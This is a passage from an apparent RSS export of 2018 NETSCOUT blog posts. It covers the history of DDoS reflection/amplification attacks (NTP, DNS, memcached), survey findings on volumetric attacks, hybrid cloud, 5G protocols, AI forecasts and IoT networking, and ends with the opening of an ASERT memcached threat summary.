<p><a href="//www.arbornetworks.com/blog/asert/wp-content/uploads/2018/03/2013-2014-peak-attack-size.jpg"><img alt="" class="alignnone size-full wp-image-9475" height="339" src="//www.arbornetworks.com/blog/asert/wp-content/uploads/2018/03/2013-2014-peak-attack-size.jpg" width="500" /></a><strong>2013-2014: The Time is Now</strong> Network Time Protocol (NTP) is designed to synchronize the clock on your laptop, smartphone, tablet, and network infrastructure devices. NTP has been implemented in all major operating systems, network infrastructure and embedded devices. There are over a hundred thousand NTP servers with administrative functions ill-advisably open to the general internet and vulnerable. In other words, compromising NTP represented a gold mine for attackers looking to amplify the size of their DDoS attack capabilities. The skilled attackers who pioneer new attack vectors often look to automate and monetize their new capabilities. Sure enough, in 2013, malware exploiting NTP was weaponized. Attack tools and booter/stresser attack services using the NTP protocol became widely available, making high volume NTP reflection/amplification DDoS attacks within reach of anyone with a grievance and an internet connection.  At this time, NTP replaced DNS as the prominent reflection/amplification vector because of its amplification potential making even larger attacks a possibility.</p>

<p><a href="//www.arbornetworks.com/blog/asert/wp-content/uploads/2018/03/NTP-Traffic-dec2013march2014.png"><img alt="NTP-Traffic-dec2013" src="http://localhost:7996/sites/default/files/inline-images/NTP-Traffic-dec2013march2014.png" /><img alt="" class="alignnone size-full wp-image-9476" data-entity-type="file" data-entity-uuid="07e90906-f733-4096-b6b4-283254f2c0c7" height="191" src="http://localhost:7996/sites/default/files/inline-images/NTP-Traffic-dec2013march2014.png" width="745" /></a> Data from our ATLAS global threat intelligence system showed an unprecedented spike in volumetric attacks, driven by the proliferation of NTP reflection/amplification attacks.</p>

<ul><li>Average NTP traffic globally in November 2013 was 1.29 GB/sec, by February 2014 it was 351.64 GB/sec</li>
	<li>NTP was used in 14% of DDoS events overall but 56% of events over 10 GB/sec and 84.7% of events over 100 GB/sec</li>
</ul><p>A series of NTP reflection/amplification attacks were launched against multiple online gaming services, causing widespread outages. As NETSCOUT Arbor CTO Darren Anstee <a href="https://www.arbornetworks.com/arbor-networks-reports-unprecedented-spike-in-ddos-attack-size-driven-by-ntp-misuse">commented at the time</a>,</p>

<p>“Arbor has been monitoring and mitigating DDoS attacks since 2000. The spike in the size and frequency of large attacks so far in 2014 has been unprecedented.”</p>

<p><strong>2015: Rise of IOB, the Internet of Botnets</strong></p>

<p>Botnets have evolved significantly over the years. In the past few years alone, with the proliferation of IoT devices, and their inherent lack of security, there has been dramatic growth in both the number and size of botnets. Combined with reflection amplification capabilities, attackers now have unprecedented power in their hands.</p>

<p>The User Datagram Protocol (UDP) is at the core of the Internet. By 2015, UDP-based reflection/amplification attacks were responsible for generating some of the largest volumetric DDoS flood attacks ever observed. In July, in a report titled <a href="http://pages.arbornetworks.com/rs/082-KNA-087/images/ASERT%20Threat%20Intelligence%20Brief%202015-07%20Amplifying%20Black%20Energy.pdf">Amplifying Black Energy</a>, NETSCOUT Arbor’s Security Engineering &amp; Response Team (ASERT) flagged a new development related to reflection/amplification attacks. ASERT had been reporting on the Black Energy malware family since 2007, noting at that time that it was a “relatively unsophisticated” DDoS attack platform. But the newly emerging Black Energy 2 plugin (ntp.dll) allowed “BE2” botnets to launch and control truly distributed NTP reflection/amplification attacks.</p>

<p>A botnet is a network of internet-connected devices, e.g. PCs, servers, mobile devices and internet of things (IoT) devices that are infected with malware and controlled as a group. The exploitation of the Black Energy 2 plugin was significant because it represented one of the first Command and Controlled (C&amp;C)  – not standalone – Windows bots to correctly and effectively implement an NTP-based reflection/amplification attack. By combining these powerful reflection/amplification DDoS capabilities with the use of ‘traditional’ Windows botnets as the original emitting source of spoofed request floods, it was now possible for Black Energy to increase the intensity of these attacks even further.</p>

<p><strong>2016: No Stone Unturned</strong><strong> </strong></p>

<p>Attackers are generally resourceful, or lazy, depending on your point of view. Sometimes they don’t need to find a new exploit, they simply return to old vulnerabilities that are left open for the taking. With over 28 million open DNS resolvers DNS is a prime example. 28 million open resolvers are tailor made for use in reflection/amplification techniques. Using large botnets such as Mirai or Satori makes generating very large attacks all too easy.</p>

<p><img alt="No Stone Unturned" data-entity-type="file" data-entity-uuid="2960f402-e105-4063-b8dc-6fcb746a2331" src="http://localhost:7996/sites/default/files/inline-images/No%20Stone%20Unturned.png" /></p>

<p><a href="//www.arbornetworks.com/blog/asert/wp-content/uploads/2018/03/ATLAS-Reflection-Amplification-Attacks-countperweek.png"><img alt="" class="alignnone size-full wp-image-9477" height="559" src="//www.arbornetworks.com/blog/asert/wp-content/uploads/2018/03/ATLAS-Reflection-Amplification-Attacks-countperweek.png" width="917" /></a> In 2016, ATLAS documented a strong resurgence of DNS as the dominant protocol being leveraged for reflection/amplification attacks. Throughout this year, the number of DNS reflection/amplification attacks being tracked per week nearly doubled, from approximately 10,500 to 18,500. other protocols were being used as well to a lesser extent; DNS, NTP and Chargen represented the top three reflection/ amplification attack vectors.</p>

<p><strong>2017: Success Breeds Imitation</strong></p>

<p>In 2017, attackers continued to use reflection/amplification techniques to exploit vulnerabilities in DNS, NTP, SSDP, CLDAP, Chargen and other protocols to maximize the scale of their attacks. Perhaps due to some highly publicized successful exploits, DNS continued to be the most common reflection/amplification attack vector. In fact, <em>the number of DNS reflection/amplification attacks was greater than all the other attack vectors combined</em>. The number of DNS attacks were nearly double the second most common exploit, NTP reflection/amplification attacks. And attackers found a new exploit this year as we observed massive growth in the use of C-LDAP for reflection/amplification attacks during the second half of 2017.</p>

<p>In the 13<sup>th</sup> annual Worldwide Infrastructure Security Report, we specifically asked respondents about the protocols used to generate volumetric reflection/ amplification attacks. Nearly all protocols showed similar activity to 2016, with DNS and NTP remaining the most commonly used vectors.</p>

<p><img alt="WISR_Figure13-1-839x1024" data-entity-type="file" data-entity-uuid="de746b0e-d0ae-4973-88f8-35a83eb51238" src="http://localhost:7996/sites/default/files/inline-images/WISR_Figure13-1-839x1024.png" /></p>

<p><a href="http://www.netscout.com/sites/default/files/asert-blog/uploads/2018/03/WISR_Figure13-1.png"><img alt="" class="alignnone size-large wp-image-9478" height="1024" src="//www.arbornetworks.com/blog/asert/wp-content/uploads/2018/03/WISR_Figure13-1-839x1024.png" width="839" /></a> New and novel attack vectors will always be developed by skilled attackers. What’s unfortunate is that attackers can continue, year-after-year, to leverage the same poorly configured or protected infrastructures to magnify their destructive capabilities.</p>

<p><strong>2018: Here We Go Again</strong></p>

<p>Already in 2018, another widely used application, memcached, has joined the ranks of high-bandwidth reflection/amplification exploits. Open source and free, memcached is a high-performance, distributed memory caching system designed to optimize dynamic web applications. February saw a significant increase in the abuse of misconfigured memcached servers residing on Internet Data Center (IDC) networks. “According to US-CERT, memcached has a bandwidth amplification factor of 10,000 to 51,000, which is by far the highest when compared with that of other UDP protocols.” Multiple independent researchers have observed these higher amplification factors in action.  Because of this, the potential impact on the victim is now more based on the capacity of transit links from the systems being exploited in these reflection/amplification attacks.</p>

<p>Memcached servers are now being used as reflectors/amplifiers to launch extremely high-volume UDP reflection/amplification attacks. They are proving especially effective because memcached servers have high-bandwidth access links and reside on networks with high-speed transit uplinks. This makes memcached servers ideal for use in high-bandwidth reflection/amplification DDoS attacks.</p>

<p><img alt="DDoS Attacks" data-entity-type="file" data-entity-uuid="705dccfc-7cf4-4dbc-b395-a23eb2a15c79" src="http://localhost:7996/sites/default/files/inline-images/memcache009.png" /></p>

<p><a href="http://www.netscout.com/sites/default/files/asert-blog/uploads/2018/03/memcache009.png"><img alt="" class="alignnone size-large wp-image-9469" height="490" src="//www.arbornetworks.com/blog/asert/wp-content/uploads/2018/03/memcache009-1024x558.png" width="900" /></a> The chart above reveals that memcached attacks have been observed at a fairly constant rate over the past few months. It's the intensity of these attacks that changed considerably earlier this year, as evidenced when you look at the aggregate bandwidth volume.</p>

<p><a href="//www.arbornetworks.com/blog/asert/wp-content/uploads/2018/03/memcache011.png"><img alt="DDoS Bandwidth" src="http://localhost:7996/sites/default/files/inline-images/DDoS%20Bandwidth.png" /><img alt="" class="alignnone size-full wp-image-9471" data-entity-type="file" data-entity-uuid="8853da88-a33a-4b2c-b920-b1232e7bc7d5" height="416" src="http://localhost:7996/sites/default/files/inline-images/DDoS%20Bandwidth.png" width="750" /></a> ASERT observed a considerable uptick in memcached reflection/amplification attacks ranging in size from a few hundred Mbps up to 500Gbps and larger.</p>

<p>“Arbor’s current assessment is that, as with most other DDoS attack methodologies, memcached DDoS attacks were initially – and for a very brief interval – employed manually by skilled attackers; they have subsequently been weaponized and made available to attackers of all skill levels via so-called ‘booter/stresser’ DDoS-for-hire botnets. The rapid increase in the prevalence of these attacks indicates that this relatively new attack vector was weaponized and broadly leveraged by attackers within a relatively short interval.”</p>

<p>In other words, here we go again.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/blog-category/asert">ASERT</category>
    <enclosure url="http://localhost:7996/sites/default/files/Largest%20DDoS%20Main%20image.jpg" length="575605" type="image/jpeg"/>
    <guid isPermaLink="false">a040220e-287e-4032-ba19-1b45acb274a3</guid>
    <pubDate>Thu, 01 Mar 2018 14:24:40 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Carlos Morales</dc:creator>
    </item>
<item>
  <title>How Hybrid Cloud Drives Digital Transformation </title>
  <link>http://localhost:7996/blog/how-hybrid-cloud-drives-digital-transformation</link>
  <description>I ran across an article in Network World that did a beautiful job of laying out the intertwined nature of the growth of hybrid cloud and digital transformation. The author points out that in the 21st century, every business is a software business, and one built for speed and innovation. Agile software development and continuous delivery allow companies to roll out constant...</description>
  <content:encoded><![CDATA[<p>I ran across <a href="https://www.networkworld.com/article/3228830/hybrid-cloud/how-the-hybrid-cloud-has-made-the-digital-transformation-possible.html">an article</a> in Network World that did a beautiful job of laying out the intertwined nature of the growth of hybrid cloud and digital transformation. The author points out that in the 21st century, every business is a software business, and one built for speed and innovation. Agile software development and continuous delivery allow companies to roll out constant updates that can be modified quickly and cheaply as user needs evolve. Cloud’s flexible infrastructure is a natural counterpart: “All that software that’s enabling this transformation toward digital experiences has to run somewhere, and it turns out a hybrid cloud strategy gives businesses maximum choice when it comes to what runs where,” notes author Pete Johnson.&nbsp;</p>

<p>But let’s take it to the next step: &nbsp;If every business in the 21st century is a software business, then data is the new currency for that business. How can you put that data to work to help your business grow and operate at top efficiency?</p>

<p>After all, digital transformation is all about agility and innovation. It’s about building interactive experiences with customers, or delivering real-time updates to a connected car via intuitive and responsive applications. So, it makes sense to take a data-driven approach to make smart decisions on what applications to build, or what changes to make on existing applications. Agile software development (DevOps) must rely on smart data and insights from smart data to provide that direction and guidance. Smart data that comes directly from a hybrid cloud (public and private) environment provides vital, real-time information about applications and services, utilization, performance and user experience.</p>

<p>To fully exploit the hybrid cloud advantage, both enterprises and carrier service providers need to leverage smart data. Smart data provides real-time insights to applications, user behavior, and experience from all cloud-based services and applications. This data provides an invaluable feedback loop to help DevOps build better, and not just faster-to-market solutions.</p>

<p>~John English, Sr. Solutions Marketing Manager, NETSCOUT</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/hybrid_cloud_dx.jpg" length="208624" type="image/jpeg"/>
    <guid isPermaLink="false">a5ca390d-1098-4aba-af35-b94bd75e6fa5</guid>
    <pubDate>Thu, 01 Mar 2018 13:00:00 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>There is No Peacetime: Volumetric Attacks Continue Unabated</title>
  <link>http://localhost:7996/blog/volumetric-ddos-attacks-continue</link>
  <description>DDoS attacks don’t observe holidays. They don’t take breathers. They don’t honor white flags. There are no truces, no prisoner swaps, no treaties or negotiations. Thousands of attacks are taking place at this very moment around the world with no sign of let-up. Peace is clearly not at hand. NETSCOUT Arbor’s 13th annual Worldwide Infrastructure Security Report (WISR), released...</description>
  <content:encoded><![CDATA[<p>DDoS attacks don’t observe holidays. They don’t take breathers. They don’t honor white flags. There are no truces, no prisoner swaps, no treaties or negotiations. Thousands of attacks are taking place at this very moment around the world with no sign of let-up. Peace is clearly not at hand.</p>

<p>NETSCOUT Arbor’s 13<sup>th</sup> annual Worldwide Infrastructure Security Report (WISR), released in January 2018, underscores the sheer relentlessness of DDoS attacks globally. A key trend we’ve observed over the past few years is the growth in size of volumetric attacks targeting cloud providers and data centers. Volumetric attacks seek to consume bandwidth either within the target network or between the target and the rest of the internet, causing congestion and preventing legitimate users from accessing networks, applications and services. While 87% of DDoS attacks are still smaller than 2 Gbps, large-scale volumetric attacks have been trending upward in size for years.</p>

<p><strong>Smaller Attacks, Bigger Impact</strong></p>

<p>In 2017, our <a href="https://www.arbornetworks.com/atlas-portal">Active Threat Level Analysis System (ATLAS)</a> found a slight reversal of this trend, with the largest observed attack topping out at around 640 Gbps. This tracks with the largest attacks reported by WISR respondents. However, this dip in the very largest attacks has not diminished their intensity or ferocity. Volumetric attackers are well aware they can wreak all the havoc they want, whether at 600 or 800 Gbps. According to our ATLAS telemetry, the average duration of an attack was 46 minutes in 2017 – down from 55 minutes the previous year. However, attackers usually start/stop an attack sporadically over an extended period of time. As a result, the average duration of an attack is less than an hour but a typical attack campaign lasts much longer than that.</p>

<p>This new dynamic is reflected in our survey findings. Volumetric attacks may be shrinking in size at the very high end, but they are growing overall and most importantly, in impact. While data center operators observed fewer attacks in 2017 than in the previous year, 45% experienced attacks that exceeded the total bandwidth available. Among data center respondents that observed attacks, 91% experienced at least one incident that impaired service delivery, while 78% experienced between one and 20 attacks that affected service.</p>

<p><strong>Growing Financial Consequences and Reputational Risk</strong></p>

<p>This growing impact is further reflected in the financial consequences of such attacks, which increased dramatically in 2017. More than half of data center respondents reported a financial impact between $10,000 and $100,000, almost twice as many as the previous year. Much of that impact is in the form of lost business, as 48% of data center operators cited “customer churn” as one of the biggest consequences of DDoS attacks. Indeed, data center operators indicated 68% of DDoS attacks targeted managed service, cloud or co-location customers. It’s not surprising that they are extremely sensitive about availability of their services and the level of DDoS protection provided by data center operators.</p>

<p>This also helps explain why 25% of data center operators surveyed include some measure of DDoS mitigation within their base offering, while another 40% offer it as an add-on, and 15% say they plan to offer DDoS protection in the year ahead. Clearly, a <a href="https://www.arbornetworks.com/research/what-is-ddos">DDoS mitigation strategy</a> is becoming an essential differentiator for data center operators and a major factor in the customer’s choice of a managed data center service.&nbsp;</p>

<p><strong>Preparing for a 21<sup>st</sup> Century Arms Race</strong></p>

<p>A couple of key conclusions emerge from these trends. One is that organizations are adopting DDoS mitigation measures more widely and using them more effectively, resulting in a decline in the overall number of observed attacks on data centers. On the other hand, this has compelled <a href="https://www.arbornetworks.com/blog/insight/not-ddos-attacks-huge-volumetric-ddos-flood-attacks-affect-layers-3-4/">volumetric attackers to</a> become craftier, launching smaller-scale attacks but targeting them to greater effect. This amounts to an arms race between attackers and defenders, with each side seeking to outsmart and outmaneuver the other side’s latest advances.</p>

<p>Our annual survey continues to find excessive reliance on conventional perimeter defenses – firewalls and intrusion detection and prevention systems (IDS/IPS) – for DDoS protection. Cybersecurity analysts agree that today’s multi-vector DDoS attacks call for a purpose-built multi-layer <a href="https://www.arbornetworks.com/ddos-protection-products/arbor-aps">DDoS mitigation solution.</a> They cite as best practice a hybrid solution combining an on-premise system that can mitigate the majority of attacks, and a <a href="https://www.arbornetworks.com/ddos-protection-products/arbor-cloud">cloud-based capability</a> that is automatically triggered in the event of a large-scale volumetric attack. Protection can be further strengthened with a <a href="https://www.arbornetworks.com/global-threat-intelligence-products">Global Threat Intelligence</a> capability and Intelligent Warning Service backed by experts in recognizing and analyzing DDoS attacks.</p>

<p>The enemy is not going to surrender. Peace is a pipe dream. Potent, state-of-the-art defenses and eternal vigilance are the order of the day. It’s time to dig in.</p>

<p>To learn more about the increasingly complex DDoS threat landscape, download the full <a href="http://arbor.link/prwisr13">Worldwide Infrastructure Security Report</a>.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/security">Security</category>
    <enclosure url="http://localhost:7996/sites/default/files/Peacetime%201200x480.jpg" length="393654" type="image/jpeg"/>
    <guid isPermaLink="false">d6dfeaac-528f-4306-8734-31f190df6d02</guid>
    <pubDate>Wed, 28 Feb 2018 19:30:17 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Gary  Sockrider</dc:creator>
    </item>
<item>
  <title>Evolution of HTTP and DNS for 5G</title>
  <link>http://localhost:7996/blog/what-http-and-dns-5g</link>
  <description>HTTP (Hypertext Transmission Protocol) is the internet communication protocol our browser uses to send information between our internet-enabled device (laptop, smartphone, Apple® watch, etc.,) and the web page it is communicating to. DNS (Domain Name System) is the protocol that translates internet addresses to find the various sites and information we seek.</description>
  <content:encoded><![CDATA[<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "FAQPage",
  "mainEntity": {
    "@type": "Question",
    "name": "What are DNS and HTTP?",
    "acceptedAnswer": {
      "@type": "Answer",
      "text": "While cruising the web, we unknowingly use DNS and HTTP protocols to navigate and interact with websites. HTTP (Hypertext Transmission Protocol) is the internet communication protocol our browser uses to send information between our internet-enabled device (laptop, smartphone, Apple® watch, etc.,) and the web page it is communicating to. DNS (Domain Name System) is the protocol that translates internet addresses to find the various sites and information we seek"
    }
  }
}
</script>
<p>While cruising the web, we unknowingly use DNS and HTTP protocols to navigate and interact with websites. HTTP (Hypertext Transmission Protocol) is the internet communication protocol our browser uses to send information between our internet-enabled device (laptop, smartphone, Apple® watch, etc.,) and the web page it is communicating to. DNS (Domain Name System) is the protocol that translates internet addresses to find the various sites and information we seek. 5G and Virtualization are leading the evolution of DNS domain translation and HTTP web service protocols with "lightweight" versions to achieve low latency and software versions to work in the cloud, raising the need for visibility and proactive service assurance of these critical web service enablers.</p>

<p>As Alan Carlton notes in his 2017 article, “<a href="https://www.computerworld.com/article/3204594/mobile-wireless/http-and-dns-in-a-5g-world.html">HTTP and DNS in 5G World</a>,” no matter where the web page is located or who develops the web browser, it is guaranteed that they will be able to interoperate because they all use the standardized HTTP protocol to communicate. DNS is equally fundamental as it is the protocol which allows end user devices to translate a given human readable URL such as “www.google.com” to a machine usable IP address that the network can make sense of.”</p>

<p>HTTP and DNS are IETF (Internet Engineering Task Force) protocol standards that have been around for almost two decades and more than three decades, respectively. While they have gone through updates and revisions to add features and improve security, HTTP and DNS are now going through revolutionary changes to get ready for 5G.</p>

<p>As Alan Carlton further notes, “(m)any technical reasons are driving the changes in HTTP and DNS. However, at the highest level, the main driver is certainly the rapid evolution of the internet architecture to the virtualized model. In the last few years, we have seen the migration of many of the internet’s applications from standalone physical web servers to virtualized platforms located in immense centralized data centers. Looking ahead, we can see that 5G networks, which are expected to be deployed in the 2020 timeframe, will take this to the next level creating new requirements for the evolution of HTTP and DNS.”</p>

<p><a href="https://www.netscout.com/solutions/virtualization">Virtualization</a> and Mobile Edge Computing are the driving forces around the evolution of these protocols. To meet the low latency and high throughput of requirements of 5G, HTTP and DNS must become more lightweight and lean with its procedures. With early, proprietary versions of 5G already rolling out this winter and an apparent acceleration of the 5G timeline from 2020 to 2019, IETF working groups must expedite their work to prepare for these new standards.</p>

<p>The most critical time to gain visibility and assure these "service enablers" is when they undergo change. That is when DNS and HTTP evolve into “lite” versions for 5G and when they transition to software or virtualized versions. &nbsp;Virtualized implementations of DNS will require software instrumentation that can bring visibility and service assurance resolution down to the virtual machine level. New "lighter" versions of HTTP and DNS made for 5G will need to be monitored to assure that they work as expected. Connect with us to learn more about assuring the next versions of HTTP and DNS.</p>

<p>To learn more about Mobile Edge Computing, please visit <a href="https://www.netscout.com/solutions/5g">https://www.netscout.com/solutions/5g</a>.</p>

<p>~ John English, Sr. Solutions Marketing Manager, NETSCOUT</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/5g%20world.jpg" length="71834" type="image/jpeg"/>
    <guid isPermaLink="false">ab07342f-c732-463a-b4ae-fa102ec4e9ea</guid>
    <pubDate>Wed, 28 Feb 2018 16:00:00 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>When Will Artificial Intelligence Exceed Human Performance?</title>
  <link>http://localhost:7996/blog/when-will-artificial-intelligence-exceed-human-performance</link>
  <description>While experts may disagree the timing of when Artificial Intelligence (AI) will replace humans in various activities, there is no doubt that AI will play a large part in society going forward. A recent article in MIT Technology Review suggests adoption will be “lumpy” with some industries, making progress faster than others. Interestingly enough, “The experts predict that AI...</description>
  <content:encoded><![CDATA[<p>While experts may disagree the timing of when Artificial Intelligence (AI) will replace humans in various activities, there is no doubt that AI will play a large part in society going forward.</p>

<p>A recent article in <a href="https://www.technologyreview.com/2017/05/31/151461/experts-predict-when-artificial-intelligence-will-exceed-human-performance/">MIT Technology Review</a> suggests adoption will be “lumpy” with some industries, making progress faster than others. Interestingly enough, “The experts predict that AI will outperform humans in the next 10&nbsp;years in tasks such as translating languages (by 2024), writing high school essays (by 2026), and driving trucks (by 2027).”</p>

<p>“The experts go on to predict a 50 percent chance that AI will be better than humans at more or less everything in about 45 years.” This result was not a consensus by any means, as they point out “North American researchers expect AI to outperform humans at everything in 74 years, researchers from Asia expect it in just 30 years.”</p>

<p>Our responsibility, like parents, is to train these systems to understand that the quality of the data being used and analyzed is of high quality, reliable, and consistent in its value.&nbsp; It would be easy to envision an AI system that was either trained solely on "fake news" or one that lacked the ability to distinguish between investigative journalism and creative writing running amok at best or doing real harm at worst.</p>

<p>Afterall, AI doesn't happen in a vacuum. We, humans, will train these systems. The quality and sources of data are critical for their success and their ability to create economic and social value. That data is the data we are creating today to connect, communicate, and make today's decisions. It is from current and similar sources that tomorrow’s decisions will rely on, so we can be smarter leaders. It is in our best interest to make sure we are using the highest quality data. The future is closer than we think.</p>

<p>~ Mike Serrano, Sr. Product Marketing Manager, NETSCOUT</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/AI.jpg" length="153830" type="image/jpeg"/>
    <guid isPermaLink="false">56296cff-0de8-4de5-bb77-ac9a14c8c74f</guid>
    <pubDate>Wed, 28 Feb 2018 16:00:00 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Getting the Network Ready to Meet IoT Expectations</title>
  <link>http://localhost:7996/blog/getting-network-ready-meet-iot-expectations</link>
  <description>All IoT devices are not created equal. Aside from the widely varying bandwidth and latency requirements from Fitbit, to a refrigerator sensor, to robotics, and to autonomous automobiles, there are also widely varying service priorities. While a heart or blood glucose level monitor will take up very little bandwidth in comparison to an in-car entertainment system, the priority...</description>
  <content:encoded><![CDATA[<p>All IoT devices are not created equal. Aside from the widely varying bandwidth and latency requirements from Fitbit, to a refrigerator sensor, to robotics, and to autonomous automobiles, there are also widely varying service priorities. While a heart or blood glucose level monitor will take up very little bandwidth in comparison to an in-car entertainment system, the priority of the former examples clearly outweighs the bandwidth intensive video streaming for entertainment as it can literally mean a matter of life or death. Responsibility for maintaining connectivity and service quality for these devices falls primarily onto the communications service provider.</p>

<p>With industry analysts predicting that the number of connected devices will reach 8 to 11 billion by the end of 2018 and grow to 20 to 50 billion devices by 2020, the surge of <a href="https://www.netscout.com/solutions/service-provider/iot-internet-things">IoT</a> is showing no signs of letting up.&nbsp; We’re already seeing it start to touch all aspects of the digital economy, and unlock enormous benefits for a range of sectors, from agriculture to automotive.</p>

<p>As more and more ‘things’ become connected while sensors, mobile devices, digital services and broadband networks dramatically increase the volume, velocity and variety of data traversing the network infrastructure, the number of transactions occurring in the network grows. There is an increased focus on improving end-user experience, and service delivery assurance will become essential for the growth and success of IoT.</p>

<p>As Steven Max Patterson notes in his 2017 article, “<a href="https://www.networkworld.com/article/3201042/internet-of-things/network-engineering-is-key-to-meeting-iot-expectations.html">Network engineering is key to meeting IoT expectations</a>.” “One size does not fit all applications. The characteristics of a robust communications layer, frequency band, maximum signal rate, nominal range, cryptography, network type, and coexistence mechanisms point that it is not magic but a lot of systems design and engineering to build application-specific communications to interconnect these devices.”</p>

<p>Currently, there are several known IoT communications technologies including: NB (Narrow Band) IoT, LTE-M (Machine), SigFox, LoRa, BlueTooth, and Wifi as well as the somewhat lesser ZigBee, ZWave, Near Field Communication (NFC), HomePlug, and 6LowPAN and Thread. As is the cases with technology maturation eventually only a few of these technologies will survive and become defacto communications for IoT. Cost, performance, availability, ease of use, and market leader use will drive this technology Darwinism to cull out the preferred communications technologies for IoT.</p>

<p>Last June, a study by the telecom analyst and research firm, 451 Research, showed that WiFi, Ethernet, 3G/4G, and Blue Tooth were the top network connectivity communication options for IoT. The newer narrow band IoT communications LTE-M, LoRa, NB-IoT and Sigfox had much lower use at the time. However, the large, early adopter communications service providers have already made significant investments in LTE-M and NB IoT networks. AT&amp;T and Verizon have committed to nationwide LTE-M networks and a number of companies are building LPWA (Low Power Wide Area) networks in unlicensed bands, most notably Comcast using LoRa (Analysys Mason Dec 13, 2016). At IoT World 2017 in May, Sprint said it is on track to complete its LTE Cat-1 deployments by the end of July and reported it will begin deploying LTE M technology in the middle of next year, and Cat-NB1 is planned for the future. Sprint has teamed up with Ericsson to help facilitate the deployments. And T-Mobile U.S. announced in September that it will be building a nationwide NB-IoT and LTE-M network in 2018 after completing successful NB-IoT network testing in July (Fierce Wireless, September 11, 2017). Overseas, Deutsches Telekom activated NB-IoT networks in Germany and Netherlands as did the Big Three Chinese mobile operators in the 2Q of 2017.</p>

<p>As Steven Max Patterson further notes: “More networking technologies will come on the scene as engineers try to match specifics of cost and performance. The constraints of bandwidth, range and power efficiency will remain tightly tied to the application. And none of the alternatives address real-time control that will require 5G networks which carriers are just beginning to prototype in test beds. Though there are competing communications methods listed, most are different enough that a specific IoT application will narrow most choices to one or two choices.”</p>

<p>The expanding world of IoT devices and services will take on an amalgam of existing and new network technologies, starting with enhanced radio access, dedicated network infrastructure, new service priority markings and performance monitoring, to assure the quality of service. Managing this new technology and the explosion of devices and services starts with visibility and a service assurance solution that scales and provides real-time insights and analytics to ensure the successful rollout and ongoing service quality.</p>

<p>~John English, Sr. Solutions Marketing Manager, NETSCOUT</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/shutterstock_446952670.jpg" length="144219" type="image/jpeg"/>
    <guid isPermaLink="false">0b720b77-3c11-4417-a43c-b3899fb0a94d</guid>
    <pubDate>Wed, 28 Feb 2018 14:00:00 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>memcached Reflection/Amplification Description and DDoS Attack Mitigation Recommendations</title>
  <link>http://localhost:7996/blog/asert/memcached-reflectionamplification-description-and-ddos-attack</link>
  <description>ASERT Threat Summary: memcached Reflection/Amplification Description and DDoS Attack Mitigation Recommendations Date/Time: 27022018 2325UTC Title/Number: memcached Reflection/Amplification Description and DDoS Attack Mitigation Recommendations - February 2018 - v1.4. Severity: Critical Distribution: TLP WHITE (see &lt;https: categories:="" availability="" authors...=""&gt;&lt;/https:&gt;</description>
  <content:encoded><![CDATA[<p><b>ASERT Threat Summary:</b> memcached Reflection/Amplification Description and DDoS Attack Mitigation Recommendations</p>

<p><b>Date/Time:</b> 27022018 2325UTC</p>

<p><b>Title/Number:</b> memcached Reflection/Amplification Description and DDoS Attack Mitigation Recommendations - February 2018 - v1.4.</p>

<p><b>Severity:</b> Critical</p>

<p><b>Distribution:</b> TLP WHITE (see &lt;<a href="https://www.us-cert.gov/tlp">https://www.us-cert.gov/tlp</a>)</p>

<p><b>Categories:</b> Availability</p>

<p><b>Authors:</b> Roland Dobbins &amp; Steinthor Bjarnason</p>

<p><b>Contributors:</b> Keshav Prabhakar, Luan Nguyen, Kirill Kasavchenko, Tomas Sundstrom, Jason Lang, &amp; Jonas Krogell.</p>

<p><b>Changes from previous version:</b> Clarified packet-size classifiers and corrected values for same. ----</p>

<p><b>Description:</b></p>

<p>Arbor has observed a significant increase in the abuse of misconfigured memcached servers residing on Internet Data Center (IDC) networks as reflectors/amplifiers to launch high-volume UDP reflection/amplification attacks. As memcached servers typically have relatively high-bandwidth access links and reside on IDC networks with high-speed transit uplinks, the nature of memcached which lends itself to abuse in high-bandwidth reflection/amplification DDoS attacks, and the rapid rise in observed prevalence of these attacks, we have classified the severity of this ASERT Threat Summary as Critical.</p>

<p>memcached is an in-memory database caching system which is typically deployed in IDC, ‘cloud’, and Infrastructure-as-a-Service (IaaS) networks to improve the performance of database-driven Web sites and other Internet-facing services. Due to its nature as a form of organic caching middleware and its lack of access controls (unless specifically compiled with a rarely-used TLS authentication option), memcached should not be exposed to the public Internet. Unfortunately, there are many memcached deployments worldwide which have been deployed using the default insecure configuration, and without benefit of situationally-appropriate network access policies implemented as transit ACLs (tACLs) to shield memcached servers from abuse by attackers.</p>

<p>In 2010, a presentation at BlackHat USA indicated that there were many insecure memcached deployments Internet-wide which could be used to retrieve and possibly alter sensitive databases of Internet-facing services such as Web servers, e-commerce sites, etc. And in November of 2017, memcached was identified as a possible reflection/amplification vector by the China-based ‘360 Okee’ security research team.</p>

